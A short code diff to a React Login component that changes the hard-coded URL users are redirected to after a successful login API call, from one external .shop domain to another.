@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://qr-scanned-app.shop/';
+      window.location.href = 'https://tub.basschipper.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
